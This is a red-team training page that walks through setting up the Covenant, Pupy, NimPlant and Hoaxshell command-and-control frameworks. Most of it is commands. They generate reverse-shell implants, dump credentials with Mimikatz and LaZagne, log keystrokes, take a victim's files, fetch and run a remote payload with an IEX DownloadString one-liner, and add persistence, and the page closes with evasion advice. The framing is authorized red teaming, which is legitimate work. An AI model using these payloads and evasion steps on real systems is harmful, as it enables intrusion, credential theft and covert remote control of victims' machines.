---
layout: training-page
title: "Lightweight C2 Frameworks — Red Team Academy"
module: "C2 Frameworks"
tags:
  - c2
  - covenant
  - pupy
  - nimplant
  - hoaxshell
  - command-and-control
page_key: "c2-lightweight-frameworks"
render_with_liquid: false
---

# Lightweight C2 Frameworks

## Why Not Just Cobalt Strike

Cobalt Strike is the industry standard — but it's expensive (~$5,000/year), heavily signatured, and overkill for many engagement scenarios. Lightweight C2 frameworks offer viable alternatives:

- **Free** (open source)
- **Less signatured** (newer, smaller user base)
- **Purpose-built** for specific scenarios (RAT functionality, PowerShell-only environments, phishing)
- **Customizable** at the source level

These aren't replacements for Cobalt Strike in sophisticated red team operations, but they're the right tool for phishing simulations, assumed breach exercises, and operations where budget or licensing is a constraint.

## Covenant — .NET-Based C2

Covenant is a .NET-based C2 framework with a web UI. Implants (called Grunts) are .NET assemblies executing in-memory, communicating via HTTP/HTTPS. It includes built-in task library, listener management, and user management for team operations.

### Installation

```bash
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant

# Using Docker (recommended)
docker build -t covenant .
docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant covenant

# Or .NET 6 direct
dotnet run
```

### Initial Setup

```bash
# Access web UI
# https://localhost:7443 (default)

# On first run, create admin user
# → Listeners → Create HTTP listener
# → Grunts → Generate launcher
```

### Creating Listeners

```yaml
# HTTP Listener configuration in UI:
Name: DefaultHttp
BindAddress: 0.0.0.0
BindPort: 80
ConnectAddresses:
  - 10.10.10.1
ConnectPort: 80
UseSSL: false
ProfileType: HTTP
```

```yaml
# HTTPS Listener with custom profile
Name: LegitTraffic
BindPort: 443
ConnectAddresses:
  - c2.yourdomain.com
UseSSL: true
SSLCertPath: /certs/c2.yourdomain.com.pfx
ProfileType: HTTP
# Cookie-based communication
```

### Generating Launchers

```
Launchers → Binary       → .NET executable Grunt launcher
Launchers → PowerShell   → PS one-liner that loads Grunt in-memory
Launchers → Wscript      → VBScript launcher
Launchers → Cscript      → CScript launcher
Launchers → MSBuild      → MSBuild .csproj launcher (fileless)
Launchers → InstallUtil  → InstallUtil bypass launcher
```

### Tasking Grunts

```
# Via web UI or API — built-in tasks:
Shell           — run shell command
ShellCmd        — run cmd.exe command  
PowerShell      — run PS command
Assembly        — run .NET assembly in-memory
WhoAmI          — current user context
GetDomainUser   — domain user enumeration
GetDomainGroup  — domain group enumeration
Mimikatz        — credential dumping
Rubeus          — Kerberos attacks
SharpHound      — BloodHound data collection
PortScan        — internal port scanning
```

### API Usage

```bash
# Covenant has a REST API for automation
TOKEN=$(curl -sk -X POST https://localhost:7443/api/users/login \
  -H "Content-Type: application/json" \
  -d '{"userName":"admin","password":"admin_password"}' | jq -r '.token')

# List active grunts
curl -sk -H "Authorization: Bearer $TOKEN" https://localhost:7443/api/grunts

# Task a grunt
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://localhost:7443/api/grunts/1/tasks \
  -d '{"Name":"Shell","Parameters":["whoami"]}'
```

## Pupy — Cross-Platform Python RAT

Pupy is a Python-based RAT supporting Windows, Linux, macOS, and Android. Its key differentiator is cross-platform support and the ability to run Python code in-memory without dropping files to disk. Python is already installed on most Linux/macOS targets.

### Installation

```bash
git clone https://github.com/n1nj4sec/pupy
cd pupy

# Docker (strongly recommended — complex dependencies)
docker build -t pupy .
docker run -it pupy

# Or direct install
pip3 install -r requirements.txt
cd pupy && python3 pupysh.py
```

### Listener Setup

```bash
# Start Pupy shell
python3 pupysh.py

# Create HTTP listener
>> listen -a http 0.0.0.0:8080

# Create HTTPS listener
>> listen -a https 0.0.0.0:443

# DNS-based listener (slow but bypasses HTTP filtering)
>> listen -a dnscnc yourdomain.com:53
```

### Generating Payloads

```bash
# Windows EXE
>> gen -f exe -t reverse_http host=10.10.10.1 port=8080

# Windows DLL
>> gen -f dll -t reverse_http host=10.10.10.1 port=8080

# Python one-liner (Linux/macOS)
>> gen -f py_oneliner -t reverse_http host=10.10.10.1 port=8080

# Bash one-liner
>> gen -f bash -t reverse_http host=10.10.10.1 port=8080

# Android APK
>> gen -f apk -t reverse_http host=10.10.10.1 port=8080

# PS1 (PowerShell)
>> gen -f ps1 -t reverse_https host=10.10.10.1 port=443
```

### Post-Exploitation Modules

```bash
# On active session (session ID: 1)
>> sessions -i 1

# Interactive shell
>> shell

# Migrate to another process
>> migrate -pid 1234

# Keylogger
>> keylogger start

# Screenshot
>> screenshot

# Credential dumping
>> mimikatz sekurlsa::logonpasswords

# Browser credential extraction
>> lazagne all

# Persistence
>> persistence --add run  # registry Run key
```

## NimPlant — Nim-Based Lightweight C2

NimPlant uses implants written in Nim — a systems programming language that compiles to native code. Nim is less common than C/C++ or Go in malware, meaning less AV/EDR signature coverage. NimPlant is lightweight, purpose-built, and significantly harder to detect than Meterpreter or default Cobalt Strike beacons.

### Installation

```bash
git clone https://github.com/chvancooten/NimPlant
cd NimPlant

# Install Nim
curl https://nim-lang.org/choosenim/init.sh -sSf | sh
# Add ~/.nimble/bin to PATH

# Install dependencies
nimble install winim zippy nimcrypto

# Server (Python)
pip3 install -r requirements.txt
```

### Configuration

```toml
# config.toml
[listener]
type = "http"            # http or https
sslCertPath = ""
sslKeyPath = ""
hostname = "10.10.10.1"  # C2 server (or domain)
ip = "0.0.0.0"
port = 80

[implant]
sleepTime = 10           # seconds between check-ins
sleepJitter = 50         # % jitter on sleep time
killDate = "2024-12-31"  # auto-delete implant after this date
userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

### Building and Running

```bash
# Build implant for Windows x64
python3 NimPlant.py compile --exe

# Build DLL (for DLL sideloading)
python3 NimPlant.py compile --dll

# Build shellcode (for injection)
python3 NimPlant.py compile --raw

# Start server
python3 NimPlant.py server

# Available commands on active implant:
nimplant> shell whoami
nimplant> upload /local/file.exe C:\Windows\Temp\file.exe
nimplant> download C:\Users\victim\secrets.txt /local/secrets.txt
nimplant> execute-assembly /local/Rubeus.exe kerberoast
nimplant> powershell Get-ADUser -Filter *
nimplant> sleep 30 25    # 30s sleep, 25% jitter
```

## Hoaxshell — Firewall-Evasive Reverse Shell

Hoaxshell generates PowerShell reverse shells using uncommon HTTP methods and headers to evade network detection. Most network security tools look for reverse shells using standard TCP connections — Hoaxshell tunnels command execution through HTTP POST/GET with randomized headers.

### Installation

```bash
git clone https://github.com/t3l3machus/hoaxshell
pip3 install -r requirements.txt
```

### Usage

```bash
# Generate basic HTTP reverse shell
python3 hoaxshell.py -s 10.10.10.1

# HTTPS (trusted cert)
python3 hoaxshell.py -s 10.10.10.1 -c /path/to/cert.pem -k /path/to/key.pem

# Constrained language mode bypass
python3 hoaxshell.py -s 10.10.10.1 --constrained-language-mode

# Encrypted (obfuscated payload)
python3 hoaxshell.py -s 10.10.10.1 -e

# Output PS one-liner to copy to target
# Example output:
# $s='10.10.10.1:8080';$id='RANDOMID';$h='application/json'...
```

### Session Interaction

```bash
# Hoaxshell gives you an interactive pseudo-shell over HTTP
# Commands run via PowerShell on the target

hoaxshell> whoami
hoaxshell> ipconfig /all
hoaxshell> Get-LocalAdmin
hoaxshell> IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.1/payload.ps1')
```

### Persistence Options

```bash
# Hoaxshell can generate persistence commands
python3 hoaxshell.py -s 10.10.10.1 --generate-payload

# Payloads include:
# Run key persistence (registry)
# Scheduled task
# WMI subscription
# Startup folder
```

## Comparison Matrix

| Framework | Language | Platforms | Detection Risk | Best For |
|---|---|---|---|---|
| Covenant | C# | Windows | Medium | .NET-heavy environments |
| Pupy | Python | Win/Lin/Mac/Android | Low-Medium | Cross-platform, Linux targets |
| NimPlant | Nim | Windows | Low | AV/EDR evasion, stealth |
| Hoaxshell | PowerShell | Windows | Low-Medium | Quick PS reverse shell |
| Metasploit | Ruby | All | High | CTF, learning, quick pops |
| Cobalt Strike | Java | All | Medium | Enterprise red teams |

## OPSEC Considerations

```bash
# Rotate C2 domains regularly
# Use domain fronting where permitted
# Categorize domains before engagement (not "Uncategorized")
# Use sleep/jitter to avoid beaconing signatures
# Never use default port 80 for obvious malware traffic
# Customize HTTP headers — default Covenant/Metasploit headers are signatured

# NimPlant: adjust sleepTime and sleepJitter in config.toml
# Covenant: customize HTTP profile (headers, URIs, cookies)
# Pupy: use encrypted transport (HTTPS or encrypted TCP)
# Hoaxshell: use -e for payload obfuscation
```
